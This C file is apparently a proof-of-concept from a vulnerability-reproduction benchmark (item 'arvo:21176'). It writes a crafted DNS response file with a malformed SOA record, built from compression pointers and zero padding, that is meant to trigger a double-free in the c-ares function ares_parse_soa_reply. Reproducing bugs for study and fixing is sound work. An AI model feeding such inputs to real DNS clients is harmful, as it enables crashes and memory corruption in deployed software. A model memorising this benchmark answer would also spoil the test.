#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:21176 */
/* Triggers: double-free in ares_parse_soa_reply */
/* Vuln class: double_free */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* DNS header: 12 bytes */
    unsigned char header[12];
    memset(header, 0, sizeof(header));
    /* ID = 0x0000 */
    /* Flags: 0x8180 (standard query response, no error) */
    header[2] = 0x81;
    header[3] = 0x80;
    /* Question count = 1 */
    header[4] = 0x00;
    header[5] = 0x01;
    /* Answer count = 1 */
    header[6] = 0x00;
    header[7] = 0x01;
    /* Authority count = 0 */
    header[8] = 0x00;
    header[9] = 0x00;
    /* Additional count = 0 */
    header[10] = 0x00;
    header[11] = 0x00;
    fwrite(header, 1, 12, f);

    /* Question section: single label "a", type SOA (0x0006), class IN (0x0001) */
    /* Label: length 1, then 'a', then terminator 0x00 */
    unsigned char qlabel[] = {0x01, 'a', 0x00};
    fwrite(qlabel, 1, 3, f);
    /* Type SOA = 0x0006 */
    unsigned char qtype[] = {0x00, 0x06};
    fwrite(qtype, 1, 2, f);
    /* Class IN = 0x0001 */
    unsigned char qclass[] = {0x00, 0x01};
    fwrite(qclass, 1, 2, f);

    /* Answer section: SOA record */
    /* Name: pointer to question (0xc00c) */
    unsigned char aname[] = {0xc0, 0x0c};
    fwrite(aname, 1, 2, f);
    /* Type SOA = 0x0006 */
    fwrite(qtype, 1, 2, f);
    /* Class IN = 0x0001 */
    fwrite(qclass, 1, 2, f);
    /* TTL = 0x00000000 */
    unsigned char ttl[] = {0x00, 0x00, 0x00, 0x00};
    fwrite(ttl, 1, 4, f);
    /* RData length: 40 bytes */
    unsigned char rdlen[] = {0x00, 0x28};
    fwrite(rdlen, 1, 2, f);
    /* RData: SOA fields */
    /* mname: pointer to question label (0xc00c) */
    unsigned char mname[] = {0xc0, 0x0c};
    fwrite(mname, 1, 2, f);
    /* rname: pointer to question label (0xc00c) */
    unsigned char rname[] = {0xc0, 0x0c};
    fwrite(rname, 1, 2, f);
    /* serial: 0x00000001 */
    unsigned char serial[] = {0x00, 0x00, 0x00, 0x01};
    fwrite(serial, 1, 4, f);
    /* refresh: 0x00000001 */
    unsigned char refresh[] = {0x00, 0x00, 0x00, 0x01};
    fwrite(refresh, 1, 4, f);
    /* retry: 0x00000001 */
    unsigned char retry[] = {0x00, 0x00, 0x00, 0x01};
    fwrite(retry, 1, 4, f);
    /* expire: 0x00000001 */
    unsigned char expire[] = {0x00, 0x00, 0x00, 0x01};
    fwrite(expire, 1, 4, f);
    /* minimum: 0x00000001 */
    unsigned char minimum[] = {0x00, 0x00, 0x00, 0x01};
    fwrite(minimum, 1, 4, f);
    /* Total RData: 2 + 2 + 4 + 4 + 4 + 4 + 4 = 24 bytes, need 40, pad with zeros */
    int i;
    for (i = 0; i < 16; i++) {
        fputc(0x00, f);
    }

    fclose(f);
    return 0;
}